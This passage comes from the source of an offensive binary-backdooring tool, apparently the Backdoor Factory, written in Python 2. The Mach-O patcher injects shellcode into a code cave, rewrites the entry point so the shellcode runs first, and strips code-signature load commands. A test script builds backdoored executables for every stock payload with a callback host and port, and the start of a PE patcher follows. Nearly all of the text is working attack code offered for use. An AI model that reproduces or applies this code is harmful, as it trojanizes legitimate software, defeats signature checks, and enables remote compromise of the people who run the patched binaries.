item['DATA'][0x50 + i:0x54 + i],\n                            'LOCAddress': locationInFIle + 0x50 + i,\n                            'Size': item['DATA'][0x54 + i:0x58 + i],\n                            'LOCTextSize': locationInFIle + 0x54 + i,\n                            'Offset': item['DATA'][0x58 + i:0x5c + i],\n                            'LocTextOffset': locationInFIle + 0x58 + i,\n                            'Alignment': item['DATA'][0x5c + i:0x60 + i],\n                            'Relocations': item['DATA'][0x60 + i:0x64 + i],\n                            'NumberOfRelocs': item['DATA'][0x64 + i:0x68 + i],\n                            'Flags': item['DATA'][0x68 + i:0x6c + i],\n                            'Reserved1': item['DATA'][0x6c + i:0x70 + i],\n                            'Reserved2': item['DATA'][0x70 + i:0x74 + i],\n                        }\n                        break\n                    else:\n                        count -= 1\n                        i += 0x40\n\n            elif item['DATA'][0:6] == \"__TEXT\" and item['Command'] == 0x19:\n                text_segment = {\n                    'segname': item['DATA'][0:0x10],\n                    'VMAddress': item['DATA'][0x10:0x18],\n                    'VMSize': item['DATA'][0x18:0x20],\n                    'File Offset': item['DATA'][0x20:0x28],\n                    'File Size': item['DATA'][0x28:0x30],\n                    'MaxVMProt': item['DATA'][0x30:0x34],\n                    'InitalVMProt': item['DATA'][0x34:0x38],\n                    'NumberOfSections': item['DATA'][0x38:0x3C],\n                    'Flags': item['DATA'][0x3c:0x40]\n                }\n                count = struct.unpack(\"<I\", text_segment['NumberOfSections'])[0]\n                i = 0\n                while count > 0:\n\n                    if '__text' in item['DATA'][0x40 + i:0x50 + i]:\n                        text_section = {\n                            'sectionName': item['DATA'][0x40 + i:0x50 + i],\n                            'segmentName': item['DATA'][0x50 + i:0x60 + i],\n                            'Address': item['DATA'][0x60 + i:0x68 + i],\n                            'LOCAddress': locationInFIle + 0x60 + i,\n                            'Size': item['DATA'][0x68 + i:0x70 + i],\n                            'LOCTextSize': locationInFIle + 0x68 + i,\n                            'Offset': item['DATA'][0x70 + i:0x74 + i],\n                            'LocTextOffset': locationInFIle + 0x70 + i,\n                            'Alignment': item['DATA'][0x74 + i:0x78 + i],\n                            'Relocations': item['DATA'][0x78 + i:0x7c + i],\n                            'NumberOfRelocs': item['DATA'][0x7c + i:0x80 + i],\n                            'Flags': item['DATA'][0x80 + i:0x84 + i],\n                            'Reserved1': item['DATA'][0x84 + i:0x88 + i],\n                            'Reserved2': item['DATA'][0x88 + i:0x8c + i],\n                            'Reserved3': item['DATA'][0x8c + i:0x90 + i],\n                        }\n\n                        break\n                    else:\n                        count -= 1\n                        i += 0x4c\n\n            if item['Command'] == 0x80000028:\n                LC_MAIN = {\n                    'LOCEntryOffset': locationInFIle,\n                    'EntryOffset': item['DATA'][0x0:0x8],\n                    'StackSize': item['DATA'][0x8:0x16]\n                }\n            elif item['Command'] == 0x00000005 and struct.unpack(\"<I\", item['DATA'][0x0:0x4])[0] == 0x01:\n                LC_UNIXTREAD = {\n                    'LOCEntryOffset': locationInFIle,\n                    'Flavor': item['DATA'][0x00:0x04],\n                    'Count': item['DATA'][0x04:0x08],\n                    'eax': item['DATA'][0x08:0x0C],\n                    'ebx': item['DATA'][0x0C:0x10],\n                    'ecx': item['DATA'][0x10:0x14],\n                    'edx': item['DATA'][0x14:0x18],\n                    'edi': item['DATA'][0x18:0x1C],\n                    'esi': item['DATA'][0x1C:0x20],\n                    'ebp': item['DATA'][0x20:0x24],\n                    'esp': item['DATA'][0x24:0x28],\n                    'ss': item['DATA'][0x28:0x2C],\n                    'eflags': item['DATA'][0x2C:0x30],\n                    'LOCeip': locationInFIle + 0x30,\n                    'eip': item['DATA'][0x30:0x34],\n                    'cs': item['DATA'][0x34:0x38],\n                    'ds': item['DATA'][0x38:0x3C],\n                    'es': item['DATA'][0x3C:0x40],\n                    'fs': item['DATA'][0x40:0x44],\n                    'gs': item['DATA'][0x44:0x48],\n                }\n            elif item['Command'] == 0x00000005 and struct.unpack(\"<I\", item['DATA'][0x0:0x4])[0] == 0x04:\n                LC_UNIXTREAD = {\n                    'LOCEntryOffset': locationInFIle,\n                    'Flavor': item['DATA'][0x00:0x04],\n                    'Count': item['DATA'][0x04:0x08],\n                    'rax': item['DATA'][0x08:0x10],\n                    'rbx': item['DATA'][0x10:0x18],\n                    'rcx': item['DATA'][0x18:0x20],\n                    'rdx': item['DATA'][0x20:0x28],\n                    'rdi': item['DATA'][0x28:0x30],\n                    'rsi': item['DATA'][0x30:0x38],\n                    'rbp': item['DATA'][0x38:0x40],\n                    'rsp': item['DATA'][0x40:0x48],\n                    'r8': item['DATA'][0x48:0x50],\n                    'r9': item['DATA'][0x50:0x58],\n                    'r10': item['DATA'][0x58:0x60],\n                    'r11': item['DATA'][0x60:0x68],\n                    'r12': item['DATA'][0x68:0x70],\n                    'r13': item['DATA'][0x70:0x78],\n                    'r14': item['DATA'][0x78:0x80],\n                    'r15': item['DATA'][0x80:0x88],\n                    'LOCrip': locationInFIle + 0x88,\n                    'rip': item['DATA'][0x88:0x90],\n                    'rflags': item['DATA'][0x90:0x98],\n                    'cs': item['DATA'][0x98:0xA0],\n                    'fs': item['DATA'][0xA0:0xA8],\n                    'gs': item['DATA'][0xA8:0xB0],\n                }\n\n            if item['Command'] == 0x000001D:\n                LC_CODE_SIGNATURE = {\n                    'Data Offset': item['DATA'][0x0:0x4],\n                    'Data Size': item['DATA'][0x0:0x8],\n                }\n\n            if item['Command'] == 0x0000002B:\n                LC_DYLIB_CODE_SIGN_DRS = {\n                    'Data Offset': item['DATA'][0x0:0x4],\n                    'Data Size': item['DATA'][0x0:0x8],\n                }\n\n            if item['last_cmd'] > last_cmd:\n                last_cmd = item['last_cmd']\n\n        _tempDict = {'text_segment': text_segment, 'text_section': text_section,\n                     'LC_MAIN': LC_MAIN, 'LC_UNIXTREAD': LC_UNIXTREAD,\n                     'LC_CODE_SIGNATURE': LC_CODE_SIGNATURE,\n                     'LC_DYLIB_CODE_SIGN_DRS': LC_DYLIB_CODE_SIGN_DRS,\n                     'last_cmd': last_cmd\n                     }\n\n        return _tempDict\n\n    def patch_macho(self):\n\n        if self.supported is False:\n            print self.FILE, \"is not supported.\"\n            return False\n\n        self.output_options()\n\n        if self.PREPROCESS is True:\n            self.preprocess()\n\n        if not os.path.exists(\"backdoored\"):\n            os.makedirs(\"backdoored\")\n\n        os_name = os.name\n\n        if os_name == 'nt':\n            self.backdoorfile = \"backdoored\\\\\" + self.OUTPUT\n        else:\n            self.backdoorfile = \"backdoored/\" + self.OUTPUT\n\n        shutil.copy2(self.FILE, self.backdoorfile)\n\n        for key, value in self.mach_hdrs.iteritems():\n            MagicNumber = value['MagicNumber']\n            text_section = self.ImpValues[key]['text_section']\n            last_cmd = self.ImpValues[key]['last_cmd']\n            LC_MAIN = self.ImpValues[key]['LC_MAIN']\n            LC_UNIXTREAD = self.ImpValues[key]['LC_UNIXTREAD']\n\n            if self.binary_header == \"\\xca\\xfe\\xba\\xbe\":\n                offset = int(self.fat_hdrs[key]['Offset'], 16)\n            else:\n                offset = 0x0\n            LC_CODE_SIGNATURE = self.ImpValues[key]['LC_CODE_SIGNATURE']\n            LC_DYLIB_CODE_SIGN_DRS = self.ImpValues[key]['LC_DYLIB_CODE_SIGN_DRS']\n\n            patchx64 = True\n            patchx86 = True\n\n            if self.FAT_FILE is True and self.FAT_PRIORITY != 'ALL':\n                if self.FAT_PRIORITY.lower() == 'x64':\n                    patchx86 = False\n                if self.FAT_PRIORITY.lower() == 'x86':\n                    patchx64 = False\n\n            with open(self.backdoorfile, 'r+b') as bin:\n                if MagicNumber == '0xfeedfacf' and patchx64 is True:\n                    print \"[*] Patching x86_64 Mach-O Binary\"\n                    cave_size = struct.unpack(\"<I\", text_section['Offset'])[0] + offset - last_cmd\n                    print \"[*] Pre-text section 'code cave' size:\", hex(cave_size)\n\n                    resultShell = self.set_shells(MagicNumber)\n                    if not resultShell:\n                        print \"[!] Could not set shell\"\n                        return False\n\n                    if len(self.shellcode) > cave_size:\n                        print \"[!] Shellcode is larger than available space\"\n                        return False\n\n                    startingLocation = struct.unpack(\"<I\", text_section['Offset'])[0] + offset - len(self.shellcode)\n\n                    if LC_UNIXTREAD != {}:\n                        print \"[*] ...with LC_UNIXTREAD format\"\n                        #print 'LC_UNIXTREAD', struct.unpack(\"<Q\", LC_UNIXTREAD['rip'])[0], struct.unpack(\"<Q\", text_section['Address'])[0]\n                        if struct.unpack(\"<Q\", LC_UNIXTREAD['rip'])[0] - struct.unpack(\"<Q\", text_section['Address'])[0] != 0x0:\n                            self.jumpLocation = struct.unpack(\"<Q\", LC_UNIXTREAD['rip'])[0] - struct.unpack(\"<Q\", text_section['Address'])[0]\n                    else:\n                        print \"[*] ...with LC_MAIN format\"\n                        #print struct.unpack(\"<Q\", LC_MAIN['EntryOffset'])[0], struct.unpack(\"<I\", text_section['Offset'])[0]\n                        if struct.unpack(\"<Q\", LC_MAIN['EntryOffset'])[0] - struct.unpack(\"<I\", text_section['Offset'])[0] != 0x0:\n                            self.jumpLocation = struct.unpack(\"<Q\", LC_MAIN['EntryOffset'])[0] - struct.unpack(\"<I\", text_section['Offset'])[0]\n\n                    resultShell = self.set_shells(MagicNumber)\n                    if not resultShell:\n                        print \"[!] Could not set shell\"\n                        return False\n                    #print 'shellcode:', self.shellcode.encode('hex')\n\n                    bin.seek(startingLocation, 0)\n                    bin.write(self.shellcode)\n                    bin.seek(text_section['LOCAddress'], 0)\n                    newAddress = struct.unpack(\"<Q\", text_section['Address'])[0] - len(self.shellcode)\n                    bin.write(struct.pack(\"<Q\", newAddress))\n                    newSize = struct.unpack(\"<Q\", text_section['Size'])[0] + len(self.shellcode)\n                    bin.write(struct.pack(\"<Q\", newSize))\n                    newOffset = struct.unpack(\"<I\", text_section['Offset'])[0] - len(self.shellcode)\n                    bin.write(struct.pack(\"<I\", newOffset))\n                    if LC_UNIXTREAD != {}:\n                        bin.seek(LC_UNIXTREAD['LOCrip'], 0)\n                        bin.write(struct.pack(\"<Q\", newAddress))\n                    elif LC_MAIN != {}:\n                        bin.seek(LC_MAIN[\"LOCEntryOffset\"], 0)\n                        bin.write(struct.pack(\"<Q\", newOffset))\n\n                elif MagicNumber == '0xfeedface' and patchx86 is True:\n                    print \"[*] Patching x86 (i386) Mach-O Binary\"\n                    cave_size = struct.unpack(\"<I\", text_section['Offset'])[0] + offset - last_cmd\n                    print \"[*] Pre-text section 'code cave' size:\", hex(cave_size)\n\n                    resultShell = self.set_shells(MagicNumber)\n                    if not resultShell:\n                        print \"[!] Could not set shell\"\n                        return False\n\n                    if len(self.shellcode) > cave_size:\n                        print \"[!] Shellcode is larger than available space\"\n                        return False\n\n                    #FIND Current Location\n                    startingLocation = struct.unpack(\"<I\", text_section['Offset'])[0] + offset - len(self.shellcode)\n\n                    if LC_UNIXTREAD != {}:\n                        print \"[*] ...with LC_UNIXTREAD format\"\n                        if struct.unpack(\"<I\", LC_UNIXTREAD['eip'])[0] - struct.unpack(\"<I\", text_section['Address'])[0] != 0x0:\n                            self.jumpLocation = struct.unpack(\"<I\", LC_UNIXTREAD['eip'])[0] - struct.unpack(\"<I\", text_section['Address'])[0]\n                    else:\n                        print \"[*] ...with LC_Main format\"\n                        if struct.unpack(\"<Q\", LC_MAIN['EntryOffset'])[0] - struct.unpack(\"<I\", text_section['Offset'])[0] != 0x0:\n                            self.jumpLocation = struct.unpack(\"<Q\", LC_MAIN['EntryOffset'])[0] - struct.unpack(\"<I\", text_section['Offset'])[0]\n\n                    resultShell = self.set_shells(MagicNumber)\n                    if not resultShell:\n                        print \"[!] Could not set shell\"\n                        return False\n\n                    bin.seek(startingLocation, 0)\n                    bin.write(self.shellcode)\n                    bin.seek(text_section['LOCAddress'], 0)\n                    newAddress = struct.unpack(\"<I\", text_section['Address'])[0] - len(self.shellcode)\n                    bin.write(struct.pack(\"<I\", newAddress))\n                    newSize = struct.unpack(\"<I\", text_section['Size'])[0] + len(self.shellcode)\n                    bin.write(struct.pack(\"<I\", newSize))\n                    newOffset = struct.unpack(\"<I\", text_section['Offset'])[0] - len(self.shellcode)\n                    bin.write(struct.pack(\"<I\", newOffset))\n                    if LC_UNIXTREAD != {}:\n                        bin.seek(LC_UNIXTREAD['LOCeip'], 0)\n                        bin.write(struct.pack(\"<I\", newAddress))\n                    else:\n                        bin.seek(LC_MAIN[\"LOCEntryOffset\"], 0)\n                        bin.write(struct.pack(\"<I\", newOffset))\n\n                else:\n                    print \"[!] Not patching this arch:\", MagicNumber\n                    continue\n\n                if LC_CODE_SIGNATURE != {}:\n                    print \"[*] Removing LC_CODE_SIGNATURE command\"\n                    bin.seek(self.mach_hdrs[key]['LOCLoadCmds'], 0)\n                    oldNumber = struct.unpack(\"<I\", bin.read(4))[0]\n                    bin.seek(self.mach_hdrs[key]['LOCLoadCmds'], 0)\n                    bin.write(struct.pack(\"<I\", oldNumber - 1))\n                    oldsize = struct.unpack(\"<I\", bin.read(4))[0]\n                    bin.seek(self.mach_hdrs[key]['LOCLoadCmds'] + 4, 0)\n                    bin.write(struct.pack(\"<I\", oldsize - 0x10))\n\n                if LC_DYLIB_CODE_SIGN_DRS != {}:\n                    print \"[*] Removing LC_DYLIB_CODE_SIGN_DRS command\"\n                    bin.seek(self.mach_hdrs[key]['LOCLoadCmds'], 0)\n                    oldNumber = struct.unpack(\"<I\", bin.read(4))[0]\n                    bin.seek(self.mach_hdrs[key]['LOCLoadCmds'], 0)\n                    bin.write(struct.pack(\"<I\", oldNumber - 1))\n                    oldsize = struct.unpack(\"<I\", bin.read(4))[0]\n                    bin.seek(self.mach_hdrs[key]['LOCLoadCmds'] + 4, 0)\n                    bin.write(struct.pack(\"<I\", oldsize - 0x10))\n\n        print \"[!] Patching Complete\"\n\n        # CHECK AND DELETE TMP FILE HERE\n        \n        if self.tmp_file != None:\n            if self.keep_temp is True:\n                # tmpfilename_orginalname.exe\n                print \"[*] Saving TempFile to:\", os.path.basename(self.FILE) + '_' + self.ORIGINAL_FILE \n                shutil.copy2(self.FILE, os.path.basename(self.FILE) + '_' + self.ORIGINAL_FILE )\n            try:\n                shutil.rmtree(self.tmp_file.name)\n            except: # OSError:\n                pass\n                #print \"[*] TempFile already removed.\"\n\n        return True\n"
        },
        {
          "name": "onionduke",
          "type": "tree",
          "content": null
        },
        {
          "name": "osslsigncode",
          "type": "tree",
          "content": null
        },
        {
          "name": "payloadtests.py",
          "type": "blob",
          "size": 5.880859375,
          "content": "#!/usr/bin/env python\n'''\n\nCopyright (c) 2013-2017, Joshua Pitts\nAll rights reserved.\n\nRedistribution and use in source and binary forms, with or without modification,\nare permitted provided that the following conditions are met:\n\n    1. Redistributions of source code must retain the above copyright notice,\n    this list of conditions and the following disclaimer.\n\n    2. Redistributions in binary form must reproduce the above copyright notice,\n    this list of conditions and the following disclaimer in the documentation\n    and/or other materials provided with the distribution.\n\n    3. Neither the name of the copyright holder nor the names of its contributors\n    may be used to endorse or promote products derived from this software without\n    specific prior written permission.\n\nTHIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS \"AS IS\"\nAND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE\nIMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE\nARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT HOLDER OR CONTRIBUTORS BE\nLIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR\nCONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF\nSUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS\nINTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN\nCONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE)\nARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE\nPOSSIBILITY OF SUCH DAMAGE.\n\n'''\n\nimport pebin\nimport machobin\nimport elfbin\nimport sys\nimport os\n\n\ndef basicDiscovery(FILE):\n        macho_supported = ['\\xcf\\xfa\\xed\\xfe', '\\xca\\xfe\\xba\\xbe',\n                           '\\xce\\xfa\\xed\\xfe',\n                           ]\n\n        testBinary = open(FILE, 'rb')\n        header = testBinary.read(4)\n        testBinary.close()\n        if 'MZ' in header:\n            return 'PE'\n        elif 'ELF' in header:\n            return 'ELF'\n        elif header in macho_supported:\n            return \"MACHO\"\n        else:\n            'Only support ELF, PE, and MACH-O file formats'\n            return None\n\nif __name__ == \"__main__\":\n    '''\n    Will create patched binaries for each payload for the type of binary provided.\n    Each payload has it's own port number.\n    Usage: ./payloadtests.py file 127.0.0.1 8080\n    '''\n    if len(sys.argv) != 4:\n        print \"Will create patched binaries for each stock shellcode/payload for the \"\n        print \"type of binary provided. Each payload type has it's own port number.\"\n        print \"Usage:\" + str(sys.argv[0]) + \" binary HOST PORT\"\n        sys.exit()\n\n    file = sys.argv[1]\n    host = sys.argv[2]\n    port = int(sys.argv[3])\n    outputfiles = {}\n\n    is_supported = basicDiscovery(file)\n\n    if is_supported is \"PE\":\n        patchtypes = ['APPEND', 'JUMP', 'SINGLE']\n        supported_file = pebin.pebin(FILE=file, OUTPUT=None, SHELL='none')\n        supported_file.run_this()\n        #print supported_file.flItms['avail_shells']\n        for aShell in supported_file.flItms['avail_shells']:\n            for patchtype in patchtypes:\n                if 'cave_miner' in aShell or 'user_supplied' in aShell:\n                    continue\n                aName = aShell + \".\" + patchtype + \".\" + str(host) + \".\" + str(port) + \".\" + file\n                print \"Creating File:\", aName\n                if patchtype == 'APPEND':\n                    supported_file = pebin.pebin(FILE=file, OUTPUT=aName,\n                                                 SHELL=aShell, HOST=host,\n                                                 PORT=port, ADD_SECTION=True)\n\n                elif patchtype == 'JUMP':\n                    supported_file = pebin.pebin(FILE=file, OUTPUT=aName,\n                                                 SHELL=aShell, HOST=host,\n                                                 PORT=port, CAVE_JUMPING=True)\n                elif patchtype == 'SINGLE':\n                    supported_file = pebin.pebin(FILE=file, OUTPUT=aName,\n                                                 SHELL=aShell, HOST=host,\n                                                 PORT=port, CAVE_JUMPING=False)\n                result = supported_file.run_this()\n                outputfiles[aName] = result\n\n            port += 1\n\n    elif is_supported is \"ELF\":\n        supported_file = elfbin.elfbin(FILE=file, OUTPUT=None, SHELL='none')\n        supported_file.run_this()\n\n        for aShell in supported_file.avail_shells:\n            if 'cave_miner' in aShell or 'user_supplied' in aShell:\n                continue\n            aName = aShell + \".\" + str(host) + \".\" + str(port) + \".\" + file\n            print \"Creating File:\", aName\n            supported_file = elfbin.elfbin(FILE=file, OUTPUT=aName,\n                                           SHELL=aShell, HOST=host,\n                                           PORT=port)\n            result = supported_file.run_this()\n            outputfiles[aName] = result\n\n            port += 1\n\n    elif is_supported is \"MACHO\":\n        supported_file = machobin.machobin(FILE=file, OUTPUT=None, SHELL='none')\n        supported_file.run_this()\n\n        for aShell in supported_file.avail_shells:\n            if 'cave_miner' in aShell or 'user_supplied' in aShell:\n                continue\n            aName = aShell + \".\" + str(host) + \".\" + str(port) + \".\" + file\n            print \"Creating File:\", aName\n            supported_file = machobin.machobin(FILE=file, OUTPUT=aName,\n                                               SHELL=aShell, HOST=host,\n                                               PORT=port, FAT_PRIORITY='ALL')\n            result = supported_file.run_this()\n            outputfiles[aName] = result\n\n            port += 1\n\n    print \"Successful files are in backdoored:\"\n    for afile, aresult in outputfiles.iteritems():\n        if aresult is True:\n            print afile, 'Success'\n        else:\n            print afile, 'Fail'\n            os.remove('backdoored/' + afile)\n"
        },
        {
          "name": "pebin.py",
          "type": "blob",
          "size": 105.4296875,
          "content": "'''\nCopyright (c) 2013-2017, Joshua Pitts\nAll rights reserved.\n\nRedistribution and use in source and binary forms, with or without modification,\nare permitted provided that the following conditions are met:\n\n    1. Redistributions of source code must retain the above copyright notice,\n    this list of conditions and the following disclaimer.\n\n    2. Redistributions in binary form must reproduce the above copyright notice,\n    this list of conditions and the following disclaimer in the documentation\n    and/or other materials provided with the distribution.\n\n    3. Neither the name of the copyright holder nor the names of its contributors\n    may be used to endorse or promote products derived from this software without\n    specific prior written permission.\n\nTHIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS \"AS IS\"\nAND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE\nIMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE\nARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT HOLDER OR CONTRIBUTORS BE\nLIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR\nCONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF\nSUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS\nINTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN\nCONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE)\nARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE\nPOSSIBILITY OF SUCH DAMAGE.\n\n'''\n\nimport sys\nimport os\nimport struct\nimport shutil\nimport platform\nimport stat\nimport time\nimport subprocess\nimport pefile\nimport operator\nimport cStringIO\nimport random\nimport string\nimport re\nimport tempfile\nfrom random import choice\nfrom winapi import winapi\nfrom intel.intelCore import intelCore\nfrom intel.intelmodules import eat_code_caves\nfrom intel.WinIntelPE32 import winI32_shellcode\nfrom intel.WinIntelPE64 import winI64_shellcode\nfrom onionduke import onionduke\nfrom onionduke.onionduke import write_rsrc\nfrom onionduke.onionduke import xor_file\n\n\nMachineTypes = {'0x0': 'AnyMachineType',\n                '0x1d3': 'Matsushita AM33',\n                '0x8664': 'x64',\n                '0x1c0': 'ARM LE',\n                '0x1c4': 'ARMv7',\n                '0xaa64': 'ARMv8 x64',\n                '0xebc': 'EFIByteCode',\n                '0x14c': 'Intel x86',\n                '0x200': 'Intel Itanium',\n                '0x9041': 'M32R',\n                '0x266': 'MIPS16',\n                '0x366': 'MIPS w/FPU',\n                '0x466': 'MIPS16 w/FPU',\n                '0x1f0': 'PowerPC LE',\n                '0x1f1': 'PowerPC w/FP',\n                '0x166': 'MIPS LE',\n                '0x1a2': 'Hitachi SH3',\n                '0x1a3': 'Hitachi SH3 DSP',\n                '0x1a6': 'Hitachi SH4',\n                '0x1a8': 'Hitachi SH5',\n                '0x1c2': 'ARM or Thumb -interworking',\n                '0x169': 'MIPS little-endian WCE v2'\n                }\n\n#What is supported:\nsupported_types = ['Intel x86', 'x64']\n\n\nclass pebin():\n    \"\"\"\n    This is the pe binary class.  PE files get fed in, stuff is checked, and patching happens.\n    \"\"\"\n    def __init__(self, FILE, OUTPUT, SHELL, NSECTION='sdata', DISK_OFFSET=0, ADD_SECTION=False,\n                 CAVE_JUMPING=False, PORT=8888, HOST=\"127.0.0.1\", SUPPLIED_SHELLCODE=None,\n                 INJECTOR=False, CHANGE_ACCESS=True, VERBOSE=False, SUPPORT_CHECK=False,\n                 SHELL_LEN=300, FIND_CAVES=False, SUFFIX=\".old\", DELETE_ORIGINAL=False, CAVE_MINER=False,\n                 IMAGE_TYPE=\"ALL\", ZERO_CERT=True, RUNAS_ADMIN=False, PATCH_DLL=True, PATCH_METHOD=\"MANUAL\",\n                 SUPPLIED_BINARY=None, XP_MODE=False, IDT_IN_CAVE=False, CODE_SIGN=False, PREPROCESS=False):\n        self.FILE = FILE\n        self.OUTPUT = OUTPUT\n        self.SHELL = SHELL\n        self.NSECTION = NSECTION\n        self.DISK_OFFSET = DISK_OFFSET\n        self.ADD_SECTION = ADD_SECTION\n        self.CAVE_JUMPING = CAVE_JUMPING\n        self.PORT = PORT\n        self.HOST = HOST\n        self.SUPPLIED_SHELLCODE = SUPPLIED_SHELLCODE\n        self.INJECTOR = INJECTOR\n        self.CHANGE_ACCESS = CHANGE_ACCESS\n        self.VERBOSE = VERBOSE\n        self.SUPPORT_CHECK = SUPPORT_CHECK\n        self.SHELL_LEN = SHELL_LEN\n        self.FIND_CAVES = FIND_CAVES\n        self.SUFFIX = SUFFIX\n        self.DELETE_ORIGINAL = DELETE_ORIGINAL\n        self.CAVE_MINER = CAVE_MINER\n        self.IMAGE_TYPE = IMAGE_TYPE\n        self.ZERO_CERT = ZERO_CERT\n        self.RUNAS_ADMIN = RUNAS_ADMIN\n        self.PATCH_DLL = PATCH_DLL\n        self.PATCH_METHOD = PATCH_METHOD.lower()\n        self.XP_MODE = XP_MODE\n        self.flItms = {}\n        self.iat_cave_loc = 0\n        self.SUPPLIED_BINARY = SUPPLIED_BINARY\n        self.CODE_SIGN = CODE_SIGN\n        self.flItms['IDT_IN_CAVE'] = IDT_IN_CAVE\n        self.flItms['curdir'] = os.path.dirname(__file__)\n        self.PREPROCESS = PREPROCESS\n        self.ORIGINAL_FILE = self.FILE\n        self.tmp_file = None\n        self.keep_temp = False\n        if self.PATCH_METHOD.lower() == 'automatic':\n            self.CAVE_JUMPING = True\n            self.ADD_SECTION = False\n        if self.PATCH_METHOD.lower() == 'replace':\n            self.PATCH_DLL = False\n\n    def run_this(self):\n        if self.INJECTOR is True:\n            self.injector()\n            sys.exit()\n        if self.FIND_CAVES is True:\n            issupported = self.support_check()\n            if issupported is False:\n                print self.FILE, \"is not supported.\"\n                return False\n            print (\"Looking for caves with a size of %s bytes (measured as an integer\" % self.SHELL_LEN)\n            self.find_all_caves()\n            return True\n\n        if self.SUPPORT_CHECK is True:\n            if not self.FILE:\n                print \"You must provide a file to see if it is supported (-f)\"\n                return False\n            try:\n                is_supported = self.support_check()\n            except Exception, e:\n                is_supported = False\n                print 'Exception:', str(e), '%s' % self.FILE\n            if is_supported is False:\n                print \"%s is not supported.\" % self.FILE\n                return False\n            else:\n                print \"%s is supported.\" % self.FILE\n                return True\n\n        self.output_options()\n        return self.patch_pe()\n\n    def gather_file_info_win(self):\n        \"\"\"\n        Gathers necessary PE header information to backdoor\n        a file and returns a dict of file information called flItms.\n        Takes a open file handle of self.binary\n        \"\"\"\n\n        self.binary.seek(int('3C', 16))\n        print \"[*] Gathering file info\"\n        self.flItms['filename'] = self.FILE\n        self.flItms['buffer'] = 0\n        self.flItms['JMPtoCodeAddress'] = 0\n        self.flItms['LocOfEntryinCode_Offset'] = self.DISK_OFFSET\n        self.flItms['dis_frm_pehdrs_sectble'] = 248\n        self.flItms['pe_header_location'] = struct.unpack('<i', self.binary.read(4))[0]\n        # Start of COFF\n        self.flItms['COFF_Start'] = self.flItms['pe_header_location'] + 4\n        self.binary.seek(self.flItms['COFF_Start'])\n        self.flItms['MachineType'] = struct.unpack('<H', self.binary.read(2))[0]\n        if self.VERBOSE is True:\n            for mactype, name in MachineTypes.iteritems():\n                if int(mactype, 16) == self.flItms['MachineType']:\n                        print 'MachineType is:', name\n        self.binary.seek(self.flItms['COFF_Start'] + 2, 0)\n        self.flItms['NumberOfSections'] = struct.unpack('<H', self.binary.read(2))[0]\n        self.flItms['TimeDateStamp'] = struct.unpack('<I', self.binary.read(4))[0]\n        self.binary.seek(self.flItms['COFF_Start'] + 16, 0)\n        self.flItms['SizeOfOptionalHeader'] = struct.unpack('<H', self.binary.read(2))[0]\n        self.flItms['Characteristics'] = struct.unpack('<H', self.binary.read(2))[0]\n        #End of COFF\n        self.flItms['OptionalHeader_start'] = self.flItms['COFF_Start'] + 20\n\n        #if self.flItms['SizeOfOptionalHeader']:\n            #Begin Standard Fields section of Optional Header\n        self.binary.seek(self.flItms['OptionalHeader_start'])\n        self.flItms['Magic'] = struct.unpack('<H', self.binary.read(2))[0]\n        self.flItms['MajorLinkerVersion'] = struct.unpack(\"!B\", self.binary.read(1))[0]\n        self.flItms['MinorLinkerVersion'] = struct.unpack(\"!B\", self.binary.read(1))[0]\n        self.flItms['SizeOfCode'] = struct.unpack(\"<I\", self.binary.read(4))[0]\n        self.flItms['SizeOfInitializedData'] = struct.unpack(\"<I\", self.binary.read(4))[0]\n        self.flItms['SizeOfUninitializedData'] = struct.unpack(\"<I\",\n                                                               self.binary.read(4))[0]\n        self.flItms['AddressOfEntryPoint'] = struct.unpack('<I', self.binary.read(4))[0]\n        self.flItms['PatchLocation'] = self.flItms['AddressOfEntryPoint']\n        self.flItms['BaseOfCode'] = struct.unpack('<I', self.binary.read(4))[0]\n        if self.flItms['Magic'] != 0x20B:\n            self.flItms['BaseOfData'] = struct.unpack('<I', self.binary.read(4))[0]\n        # End Standard Fields section of Optional Header\n        # Begin Windows-Specific Fields of Optional Header\n        if self.flItms['Magic'] == 0x20B:\n            self.flItms['ImageBase'] = struct.unpack('<Q', self.binary.read(8))[0]\n        else:\n            self.flItms['ImageBase'] = struct.unpack('<I', self.binary.read(4))[0]\n        self.flItms['SectionAlignment'] = struct.unpack('<I', self.binary.read(4))[0]\n        self.flItms['FileAlignment'] = struct.unpack('<I', self.binary.read(4))[0]\n        self.flItms['MajorOperatingSystemVersion'] = struct.unpack('<H',\n                                                                   self.binary.read(2))[0]\n        self.flItms['MinorOperatingSystemVersion'] = struct.unpack('<H',\n                                                                   self.binary.read(2))[0]\n        self.flItms['MajorImageVersion'] = struct.unpack('<H', self.binary.read(2))[0]\n        self.flItms['MinorImageVersion'] = struct.unpack('<H', self.binary.read(2))[0]\n        self.flItms['MajorSubsystemVersion'] = struct.unpack('<H', self.binary.read(2))[0]\n        self.flItms['MinorSubsystemVersion'] = struct.unpack('<H', self.binary.read(2))[0]\n        self.flItms['Win32VersionValue'] = struct.unpack('<I', self.binary.read(4))[0]\n        